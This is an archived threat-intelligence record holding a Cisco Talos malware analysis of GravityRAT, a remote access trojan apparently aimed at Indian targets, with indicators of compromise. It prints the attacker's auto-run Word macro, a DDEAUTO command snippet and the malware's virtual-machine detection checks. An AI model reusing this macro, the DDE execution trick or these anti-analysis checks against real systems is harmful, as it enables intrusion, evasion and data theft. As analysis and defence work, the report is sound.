{
    "id": "9f247ad8-9d4a-4baf-bd30-44a79451b5fb",
    "created_at": "2022-10-25T16:48:16.462125Z",
    "updated_at": "2025-03-27T02:05:23.221165Z",
    "deleted_at": null,
    "sha1_hash": "e135ed30a2ce96d99b5227e77e0ed65fb2655158",
    "title": "Cisco's Talos Intelligence Group Blog: GravityRAT - The Two-Year Evolution Of An APT Targeting India",
    "authors": "",
    "file_creation_date": "2018-04-28T14:13:38Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 678548,
    "plain_text": "y\nInformation\n\n\np\nCenter\n\n\ny pp\nCommunities\n\n\nBlog\n\n\n**T H U R S D AY, A PR I L 2 6, 2 0 1 8**\n\n# GravityRAT - The Two-Year Evolution Of An APT Targeting India\n\n[This blog post is authored by Warren Mercer and Paul Rascagneres.](https://twitter.com/securitybeard)\n\n\nSearch Blog\n\n\n**S UB S C R IB E TO OUR FE E D**\n\nPosts\n\nComments\n\n[Subscribe via Email](http://www.talosintelligence.com/blog_subscription)\n\n**B LOG A R C HIV E**\n\n[▼ 2 01 8](javascript:void(0)) (63)\n\n[▼ A P RI L](javascript:void(0)) (21)\n\n[Threat Round Up for April 20-27](https://blog.talosintelligence.com/2018/04/threat-round-up-0420-0427.html)\n\nGravityRAT - The Two-Year Evolution\n\nOf An APT Targ...\n\n[Vulnerability Spotlight: Hyland](https://blog.talosintelligence.com/2018/04/hyland-vulnerabilities-code-execution.html)\n\nPerceptive Documen...\n\n[Cryptomining Campaign Returns](https://blog.talosintelligence.com/2018/04/cryptomining-campaign-returns-coal-not-diamond.html)\n\nCoal and Not Diamond...\n\n[Beers with Talos EP27: Smart Install,](https://blog.talosintelligence.com/2018/04/beers-with-talos-ep27-smart-install.html)\n\nVuln Process\n\n\n-----\n\n## SUMMARY\n\nToday, Cisco Talos is uncovering a new piece of malware, which has remained under the radar for\n\nthe past two years while it continues to be developed. Several weeks ago, we identified the use of\n\nthe latest version of this RAT (Remote Access Tool). In this article, we will discuss the technical\n\ncapabilities, the evolution, development and potential attribution of what we are calling GravityRAT.\n\nGravityRAT has been under ongoing development for at least 18 months, during which the developer\n\nhas implemented new features. We've seen file exfiltration, remote command execution capability\n\nand anti-vm techniques added throughout the life of GravityRAT. This consistent evolution beyond\n\nstandard remote code execution is concerning because it shows determination and innovation by\n\nthe actor.\n\nThroughout our investigation, we observed several malicious documents used to attack victims,\n\nwhich we will discuss. These malicious documents were used by the developer to run several tests\n\non the popular analysis platform VirusTotal. Using VirusTotal allowed the developer to make\n\nchanges in an attempt to decrease antivirus detection.\n\nAlthough GravityRAT has not been previously published or discussed, there was some information\n\nfrom the National Computer Emergency Response Team (CERT) of India describing GravityRAT as\n\n[being used in targeted attacks against India. Finally, we will discuss specific attribution elements](https://nic-cert.nic.in/NIC_CERT/pdf/13-Advisory for Malicious Targeted Attack Campaign.pdf)\n\ndiscovered during our research into GravityRAT as we identify specific information, which we believe\n\nto be leaked by the developer, such as location, and potentially their first name.\n\n\nVideo Camera Fi...\n\n[Threat Roundup for April 6 - 13](https://blog.talosintelligence.com/2018/04/threat-round-up-0406-0413.html)\n\n[Vulnerability Spotlight: Multiple](https://blog.talosintelligence.com/2018/04/vuln-moxa-edr-810.html)\n\nVulnerabilities ...\n\n[Malware monitor - leveraging](https://blog.talosintelligence.com/2018/04/malware-monitor-pyrebox-for-analysis.html)\n\nPyREBox for malware a...\n\n[Vulnerability Spotlight: TALOS-2018-](https://blog.talosintelligence.com/2018/04/vulnerability-spotlight-talos-2018-0529-531.html)\n\n0529-531 - Mul...\n\n[Vulnerability Spotlight: Multiple](https://blog.talosintelligence.com/2018/04/simple-direct-media-layer-vulnerabilities.html)\n\nSimple DirectMed...\n\n[Vulnerability Spotlight: Multiple](https://blog.talosintelligence.com/2018/04/PhotoLine-PSD-Code-Execution.html)\n\nComputerinsel Ph...\n\n[Microsoft Patch Tuesday - April](https://blog.talosintelligence.com/2018/04/ms-tuesday.html)\n\n2018\n\n[IcedID Banking Trojan Teams up](https://blog.talosintelligence.com/2018/04/icedid-banking-trojan.html)\n\nwith Ursnif/Dreambo...\n\n[Beers with Talos EP26: Talos is](https://blog.talosintelligence.com/2018/04/beers-with-talos-ep26-talos-is-holding.html)\n\nHolding a Conferen...\n\n[Critical Infrastructure at Risk:](https://blog.talosintelligence.com/2018/04/critical-infrastructure-at-risk.html)\n\nAdvanced Actors T...\n\n[Vulnerability Spotlight: Natus](https://blog.talosintelligence.com/2018/04/vulnerability-spotlight-natus.html)\n\nNeuroWorks Multiple...\n\n[Vulnerability Spotlight: Moxa AWK-](https://blog.talosintelligence.com/2018/04/vulnerability-spotlight-moxa-awk-3131a.html)\n\n3131A Multiple F...\n\n[Fake AV Investigation Unearths](https://blog.talosintelligence.com/2018/04/fake-av-investigation-unearths-kevdroid.html)\n\nKevDroid, New Andro...\n\n[► M A RC H](javascript:void(0)) (10)\n\n[► FE BRU A RY](javascript:void(0)) (14)\n\n[► J A N U A RY](javascript:void(0)) (18)\n\n[► 2 01 7](javascript:void(0)) (172)\n\n[► 2 01 6](javascript:void(0)) (98)\n\n[► 2 01 5](javascript:void(0)) (62)\n\n[► 2 01 4](javascript:void(0)) (67)\n\n\n-----\n\n## INFECTION VECTORS\n\n Malicious Office Documents\n\nThe majority of the malicious documents crafted by the malware author are Microsoft Office Word\n\ndocuments. The attacker uses an embedded macro in order to execute malicious code on the\n\nvictim's system. The document opens and appears as such:\n\n\n\n[► 2 009](javascript:void(0)) (146)\n\n[► 2 008](javascript:void(0)) (37)\n\n**R E C OM M E N DE D B LOG S**\n\n[C I S C O BL O G](https://blogs.cisco.com)\n\n[Talos Threat Round Up for April 20-27](https://blogs.cisco.com/security/talos/talos-threat-round-up-for-april-20-27)\n\n[C L A M A V® BL O G](http://blog.clamav.net/)\n\n[ClamAV 0.100.0 has been released!](https://feedproxy.google.com/~r/Clamav/~3/takVpuywnTk/clamav-01000-has-been-released.html)\n\n[S N O RT BL O G](http://blog.snort.org/)\n\nSnort Subscriber Rule Set Update for\n01/16/2018\n\n\n-----\n\ntheir systems. By enabling macros, the malware is able to begin it s execution. We discovered that\n\nthe embedded macro is quite small when extracted.\n\nSub AutoOpen()\n\nIf Not Dir(Environ(\"TEMP\") + \"\\image4.exe\") <> \"\" Then\n\nConst lCancelled_c As Long = 0\n\nDim sSaveAsPath As String\n\nsSaveAsPath =\n\nCreateObject(\"WScript.Shell\").ExpandEnvironmentStrings(\"%Temp%\") +\n\n\"\\temporary.zip\"\n\nIf VBA.LenB(sSaveAsPath) = lCancelled_c Then Exit Sub\n\nActiveDocument.Save\n\nApplication.Documents.Add ActiveDocument.FullName\n\nActiveDocument.SaveAs sSaveAsPath\n\nActiveDocument.Close\n\nSet app = CreateObject(\"Shell.Application\")\n\nExtractTo =\n\nCreateObject(\"WScript.Shell\").ExpandEnvironmentStrings(\"%Temp%\")\n\nExtractByExtension app.NameSpace(Environ(\"TEMP\") + \"\\temporary.zip\"),\n\n\"exe\", ExtractTo\n\nEnd If\n\nEnd Sub\n\nSub ExtractByExtension(fldr, ext, dst)\n\nSet FSO = CreateObject(\"Scripting.FileSystemObject\")\n\nSet app = CreateObject(\"Shell.Application\")\n\nFor Each f In fldr.Items\n\nIf f.Type = \"File folder\" Then\n\nExtractByExtension f.GetFolder, ext, dst\n\nElseIf LCase(FSO.GetExtensionName(f.Name)) = LCase(ext) Then\n\nIf Not Dir(Environ(\"TEMP\") + \"\\image4.exe\") <> \"\" Then\n\napp.NameSpace(dst).CopyHere f.Path, &H4\n\n\n-----\n\nDAILY /f /RI 10 /du 24:00 /st 00:01\n\nEnd Sub\n\nThis macro contains three functions:\n\nThe first one is executed when the document is opened. The purpose is to copy the\nactive document (the opened Word document) in a temporary directory and to rename it\nas a ZIP archive. Indeed, the docx format is, in fact, a common ZIP archive, and can be\nunzipped using common tools.\n\nThe second function decompresses this 'temporary.zip' file and extracts the .exe file\nstored in it.\n\nThe third creates a scheduled task, named 'wordtest', to execute this malicious file\nevery day.\n\nWith this approach, the attacker ensures that there is no direct execution (the executable is\n\nexecuted thanks to scheduled tasks), there's no download of an additional payload, and finally, the\n\nauthor uses the fact that the docx format is an archive in order to include its executable\n\n(GravityRAT).\n\n## Testing By The Author\n\nDuring our tracking, we identified several malicious documents submitted from this actor on\n\nVirusTotal for testing purposes. They tested the detection on macros (by modifying them, or by\n\nexecuting the calc instead of the malicious payload) and the developers tried dynamic data\n\nexchange (DDE) execution in the Office document. This is abusing the DDE protocol which exists\n\nwithin Microsoft Office documents. Whilst this is a feature Microsoft provide it is also a feature that\n\n[an attacker can leverage for malicious activity, Microsoft published mitigation information here](https://docs.microsoft.com/en-us/security-updates/securityadvisories/2017/4053440)\n\npreviously. The developer crafted Office Word and Excel documents to see the detection in\n\nVirusTotal. The authors tried to hide the DDE object in a different part of the document — in the\n\n\n-----\n\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n\n<w:document [...redated...}] mc:Ignorable=\"w14 w15 wp14\"><w:body><w:p\n\nw:rsidR=\"00215C91\" w:rsidRDefault=\"008C166A\"><w:r><w:fldChar\n\nw:fldCharType=\"begin\"/></w:r><w:r><w:instrText xml:space=\"preserve\">\n\n</w:instrText></w:r><w:r><w:rPr><w:rFonts w:ascii=\"Helvetica\"\n\nw:hAnsi=\"Helvetica\" w:cs=\"Helvetica\"/><w:color w:val=\"383838\"/><w:spacing\n\nw:val=\"3\"/><w:sz w:val=\"26\"/><w:szCs w:val=\"26\"/><w:shd w:val=\"clear\"\n\nw:color=\"auto\" w:fill=\"FFFFFF\"/></w:rPr><w:instrText>DDEAUTO\n\nc:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\"</w:instrText></w:r><w:r>\n\n<w:instrText xml:space=\"preserve\"> </w:instrText></w:r><w:r><w:fldChar\n\nw:fldCharType=\"end\"/></w:r><w:bookmarkStart w:id=\"0\" w:name=\"_GoBack\"/>\n\n<w:bookmarkEnd w:id=\"0\"/></w:p><w:sectPr w:rsidR=\"00215C91\"><w:pgSz\n\nw:w=\"12240\" w:h=\"15840\"/><w:pgMar w:top=\"1440\" w:right=\"1440\"\n\nw:bottom=\"1440\" w:left=\"1440\" w:header=\"720\" w:footer=\"720\" w:gutter=\"0\"/>\n\n<w:cols w:space=\"720\"/><w:docGrid w:linePitch=\"360\"/></w:sectPr></w:body>\n\n</w:document>\n\n\nWe believe the filenames of the submitted samples are clearly testing docs, using different\n\nmethods and Office tricks to attempt to ensure his malware was undetected. Those names were:\n\ntestnew1.docx\n\nTest123.docx\n\ntest456.docx\n\ntest2.docx\n\nbook1test2.xlsx\n\nTest123.doc\n\n## GRAVITYRAT\n\n\n-----\n\nactive, and how their attacks had evolved. We were able to discover four distinct versions of\n\nGravityRAT, developed over two years. Next, we will go through what we believe is the development\n\nlife cycle and feature-addition mission carried out by this developer.\n\n## Version G1\n\nThe malware author uses a versioning system starting by the G letter. The oldest version we\n\nidentified is G1. Here is the PDB path of the sample:\n\n\nf:\\F\\Windows Work\\G1\\Adeel's Laptop\\G1 Main\n\nVirus\\systemInterrupts\\gravity\\obj\\x86\\Debug\\systemInterrupts.pdb\n\n\nYou can notice the potential first name of the developers: Adeel. Of course, this information can be\n\nmanipulated by the malware author. This sample was compiled in December 2016. The original\n\nfilename of the sample was resume.exe.\n\nThe purpose of this version was to steal information on the compromised system:\n\nMAC Address\n\nComputer name\n\nUsername\n\nIP address\n\nDate\n\nSteal files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf and .pdf\n\nThe volumes mapped on the system\n\nAll this information was then sent to one of the following domains:\n\n\n-----\n\nG1 also had the ability to execute commands remotely on the infected host machine at the author's\n\nwill.\n\n## Version G2\n\nWe identified a new variant used in July 2017 named G2. Here is the PDB of the sample:\n\n\ne:\\Windows Work\\G2\\G2 Main Virus\\Microsoft Virus Solutions (G2 v5)\n\n(Current)\\Microsoft Virus Solutions\\obj\\Debug\\Windows Wireless 802.11.pdb\n\n\nFor this version, the developer modified the architecture of the malware. The main code aims to\n\nload and execute two additional .NET binaries stored in the resources of the file:\n\n[The first resource is a legitimate open-source library available on GitHub. It's a .NET](https://github.com/dahall/TaskScheduler)\nwrapper for the Windows Task Scheduler\n\nThe second is the G2 version of GravityRAT\n\nThis variant shares the same command and control (C2) servers as G1, however, we have an\n\nadditional 'payload' variable added to G2.\n\n\n-----\n\nThis variant has almost identical capabilities as the previous, except one additional functionality: It\n\ncollects the CPU information in the Win32_Processor entry via WMI request (Processor ID, Name,\n\nManufacturer and the clock speed). The attacker is most likely using this information as part of an\n\nanti-vm attempt within this malware. This is used to try and thwart analysis in virtual environments.\n\nIn a slight change to the previous variant, the new payloads are executed with a Windows Scheduled\n\nTask. This would explain the inclusion of the .NET wrapper.\n\nThe analysed sample contained a decoy picture document in the resource section:\n\n\n-----\n\n## Version G3\n\nIn August 2017, the author of GravityRAT used a new variant of its malware, G3. Here is the PDB:\n\n\nF:\\Projects\\g3\\G3 Version 4.0\\G3\\G3\\obj\\Release\\Intel Core.pdb\n\n\nThis variant uses the same method as G2, and includes a legitimate library in the resource section.\n\nThe developers also added additional language support to the library:\n\nGerman\n\nSpanish\n\nFrench\n\nItalian\n\nChinese\n\n\n-----\n\nThe author changed the backend of the C2 server with this variant. The URI changed too, it contains\n\nthe GravityRAT variant name:\n\nAugust was also the same month the Indian CERT notified potential victims that GravityRAT had\n\nbeen used in a targeted campaign. Given the ongoing development nature of this malware, it meant\n\nanother variant was most likely due.\n\n## Version GX\n\nThe latest version of GravityRAT was created in December 2017 named GX. Here is the PDB:\n\n\nC:\\Users\\The Invincible\\Desktop\\gx\\gx-current\nprogram\\LSASS\\obj\\Release\\LSASS.pdb\n\n\n-----\n\np\n\nThis variant has the same features as before, but this time, some new features are added:\n\nIt collects open ports on the victim host by running the netstat command\n\nIt lists all the running processes\n\nIt lists available services on the system\n\nIt exfiltrates .ppt and .pptx file, in addition to the extension mentioned in the G1 variant\n\nIf a USB key is connected on the system, the malware steals the file based on an\nextension list\n\nIt supports file encryption (AES with the key \"lolomycin2017\")\n\nIt collects information on the account (account type, description, domain name, full\nname, SID and status)\n\nIt checks if the system is a virtual machine with several techniques\n\nThe developer implemented a total of seven techniques to identify if the compromised system is a\n\nvirtual machine.\n\nThe first technique consists of looking at any additional tools used by the hypervisor that are\n\ninstalled on the system (by checking a registry key):\n\nThe second technique uses a WMI request to the BIOS version (Win32_BIOS entry). If the response\n\ncontains: \"VMware\", \"Virtual\", \"XEN\", \"Xen\" or \"A M I\" the system is considered as a virtual machine.\n\nAdditionally, the malware checks the SerialNumber and the version of the BIOS.\n\n\n-----\n\nThe third technique uses the Win32_Computer entry in WMI. It checks if the manufacturer contains\n\n\"VIRTUAL\", \"VMWARE\" or \"VirtualBox\".\n\nThe fourth technique checks the Processor ID of the system.\n\nThe fifth technique counts the number of cores in the infected system (the author expects more\n\nthan one core)\n\n\n-----\n\nThe sixth technique checks the current CPU temperature of the system (the\n\nMSAcpi_ThermalZoneTemperature entry). Indeed, some hypervisors (VMWare, VirtualBox and\n\nHyper-V) do not support temperature check. The WMI request simply replies \"not supported\". This\n\nbehaviour can be used to detect if the targeted system is a real machine.\n\nThe last technique uses the MAC Address of the infected system. If the MAC Address starts by a\n\nwell-known hexadecimal number, the system is identified as a virtual machine.\n\nThe C2 servers communication is performed in HTTP as it did previously. The variant version of GX\n\nis used in the URI. The C2 servers we can see are shared with the previous variants:\n\n\n-----\n\n## WHAT WE KNOW ABOUT THE AUTHOR\n\nBelow, we will present evidence that we have obtained regarding the attacker and the associated\n\nmalware. Obviously, attribution is a complex field. The developers could be using a proxy or a VPN in\n\norder to fake the origin of the submission. But, we will still simply present some facts concerning\n\nthis actor.\n\nThe developer used at least two different usernames in the past two years: \"The Invincible\" and\n\n\"TheMartian.\" In the oldest version of GravityRAT, the attacker potentially leaked his or her first\n\nname in the PDB: \"Adeel\" — the path contained \"Adeel's Laptop\". Additionally, all the malicious Office\n\ndocuments, and more specifically the documents used to test anti-virus on VirusTotal, were\n\nsubmitted from Pakistan. One of the four PE files in the IOCs section was sent from Pakistan, too.\n\n[In August 2017, the Indian National CERT published an advisory about malicious targeted](https://nic-cert.nic.in/NIC_CERT/pdf/13-Advisory for Malicious Targeted Attack Campaign.pdf)\n\ncampaigns. This advisory mentions the C2 server infrastructure of GravityRAT, which means the\n\nGravityRAT author likely targeted Indian entities/organisations. By leveraging Cisco Umbrella and\n\nusing the Investigate tool, we were able to determine that across all of the C2 domains listed, we\n\nsaw a large influx of traffic originating from India, as evidenced by the National CERT, all of the C2\n\ndomains were at least 50 percent requested by Indian IP infrastructure. It is possible that some of\n\nthe non-Indian IP space requests may artefacts be due to our own research.\n\n\n-----\n\n## CONCLUSION\n\nThis actor is probably not the most advanced actor we've seen. But he or she managed to stay\n\nunder the radar since 2016. They worked on malicious code, and produced four variants. Each new\n\nvariant included new features. The developer used the same C2 infrastructure all this time. The\n\ndeveloper was clever enough to keep this infrastructure safe, and not have it blacklisted by a\n\nsecurity vendor. The actor took their time to ensure they were not within a virtual environment to\n\navoid analysis. However, they did not take any time at all to attempt to obfuscate their .NET code.\n\nThe code was largely trivial to reverse engineer, which meant static analysis was an easy option for\n\nthis piece of malware.\n\nThe Indian CERT published an advisory about this actor, which suggest they targeted Indian entities\n\nand organizations.\n\nThe author leaked information within the samples (i.e. Adeel) and on the VirusTotal platform.\n\nThanks to this information, we we able to understand how they tested malicious documents in order\n\nto decrease detection ratios across many popular engines. During this testing period, all the\n\nsamples were uploaded from Pakistan to VirusTotal.\n\n\n-----\n\n[Advanced Malware Protection (AMP) is ideally](https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/advanced-malware-protection&sa=D&ust=1524553763505000)\n\nsuited to prevent the execution of the malware\n\nused by these threat actors.\n\n[CWS or WSA web scanning prevents access to](https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/cloud-web-security/index.html&sa=D&ust=1524553763506000)\n\nmalicious websites and detects malware used\n\nin these attacks.\n\n[Email Security can block malicious emails sent](https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/email-security-appliance/index.html&sa=D&ust=1524553763507000)\n\nby threat actors as part of their campaign.\n\n[Network Security appliances such as NGFW,](https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/firewalls/index.html&sa=D&ust=1524553763508000)\n\n[NGIPS, and Meraki MX can detect malicious](https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/intrusion-prevention-system-ips/index.html&sa=D&ust=1524553763508000)\n\nactivity associated with this threat.\n\n[AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security](https://www.google.com/url?q=https://www.cisco.com/c/en/us/solutions/enterprise-networks/amp-threat-grid/index.html&sa=D&ust=1524553763509000)\n\nproducts.\n\n[Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains,](https://www.google.com/url?q=https://umbrella.cisco.com/&sa=D&ust=1524553763510000)\n\nIPs, and URLs, whether users are on or off the corporate network.\n\nOpen Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest\n\n[rule pack available for purchase on Snort.org.](https://www.google.com/url?q=https://www.snort.org/products&sa=D&ust=1524553763510000)\n\n## IOCS\n\n Malicious Documents\n\n\n-----\n\n835e759735438cd3ad8f4c6dd8b035a3a07d6ce5ce48aedff1bcad962def1aa4\n\nC14f859eed0f4540ab41362d963388518a232deef8ecc63eb072d5477e151719\n\ned0eadd8e8e82e7d3829d71ab0926c409a23bf2e7a4ff6ea5b533c5defba4f2a\n\nf4806c5e4449a6f0fe5e93321561811e520f738cfe8d1cf198ef12672ff06136\n\nOTHER MALICIOUS DOCUMENTS (DDE)\n\n911269e72cd6ed4835040483c4860294d26bfb3b351df718afd367267cd9024f\n\nfb7aa28a9d8fcfcabacd7f390cee5a5ed67734602f6dfa599bff63466694d210\n\nef4769606adcd4f623eea29561596e5c0c628cb3932b30428c38cfe852aa8301\n\ncd140cf5a9030177316a15bef19745b0bebb4eb453ddb4038b5f15dacfaeb3a2\n\n07682c1626c80fa1bb33d7368f6539edf8867faeea4b94fedf2afd4565b91105\n\n## GravityRAT\nG1\n\n9f30163c0fe99825022649c5a066a4c972b76210368531d0cfa4c1736c32fb3a\n\nG2\n\n1993f8d2606c83e22a262ac93cc9f69f972c04460831115b57b3f6244ac128bc\n\nG3\n\n99dd67915566c0951b78d323bb066eb5b130cc7ebd6355ec0338469876503f90\n\nGX\n\n1c0ea462f0bbd7acfdf4c6daf3cb8ce09e1375b766fbd3ff89f40c0aa3f4fc96\n\n## C2 Servers\n\nhxxp://cone[.]msoftupdates.com:46769\n\nhxxp://ctwo[.]msoftupdates.com:46769\n\nhxxp://cthree[.]msoftupdates.com:46769\n\nhxxp://eone[.]msoftupdates.eu:46769\n\nhxxp://etwo[.]msoftupdates.eu:46769\n\n\n-----\n\nmsoftupdates[.]com\n\nmsoftupdates[.]eu\n\nmylogisoft[.]com\n\nURI:\n\n/Gvty@/1ns3rt_39291384.php\n\n/Gvty@/newIns3rt.php\n\n/Gvty@/payloads\n\n/Gvty@/ip.php\n\n/G3/ServerSide/G3.php\n\n/G3/Payload/\n\n/GX/GX-Server.php\n\n/GetActiveDomains.php\n\nP O S T E D BY [P AU L RAS C AG NE RE S AT](https://www.blogger.com/profile/10073079939160046441) 1 1 : 1 1 AM\n\nL ABE L S : [. NE T, AP T, G RAVI T Y RAT, I ND I A](https://blog.talosintelligence.com/search/label/.NET) [, M AC RO S, M AL D O C, M ALWARE ANALY S I S](https://blog.talosintelligence.com/search/label/macros)\n\nS H A RE T H I S\n\nP O S T\n\nNO COMMENTS:\n\nPOST A COMMENT\n\n\n-----\n\n**Comment as:** [Select profile...]\n\n\n\n[Select profile...]\n\n\n**PreviewPreview**\n\n\nNE WE R\n\nP O S T\n\nS U BS C RI BE T O : [P O S T C O M M E NT S (AT O M )](https://blog.talosintelligence.com/feeds/6188594294975286687/comments/default)\n\n\n**PublishPublish**\n\n\n[H O M E](https://blog.talosintelligence.com/)\n\n\nO L D E R\n\nP O S T\n\n\n[Software](http://talosintelligence.com/software)\n\n[Reputation Center](http://talosintelligence.com/reputation)\n\n[Vulnerability Information](http://talosintelligence.com/vulnerability-reports)\n\n\n[Library](http://talosintelligence.com/resources)\n\n[Support Communities](http://talosintelligence.com/community)\n\n[Microsoft Advisory Snort Rules](http://talosintelligence.com/ms_advisories)\n\n\n[IP Blacklist Download](http://talosintelligence.com/documents/ip-blacklist)\n\n[AWBO Exercises](http://talosintelligence.com/awbo_exercises)\n\n[About Talos](http://talosintelligence.com/about)\n\n\n[Careers](http://talosintelligence.com/careers)\n\n[Blog](https://blog.talosintelligence.com)\n\n\nCONNECT WITH US\n\n\n© 2018 Cisco Systems, Inc. and/or its affiliates. All rights reserved. View our [Privacy Policy here.](http://www.cisco.com/web/siteassets/legal/privacy_full.html)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2018/2018.04.26.GravityRAT/GravityRAT.pdf"
    ],
    "report_names": [
        "GravityRAT"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716496,
    "ts_updated_at": 1743041123,
    "ts_creation_date": 1524924818,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/e135ed30a2ce96d99b5227e77e0ed65fb2655158.pdf",
        "text": "https://archive.orkl.eu/e135ed30a2ce96d99b5227e77e0ed65fb2655158.txt",
        "img": "https://archive.orkl.eu/e135ed30a2ce96d99b5227e77e0ed65fb2655158.jpg"
    }
}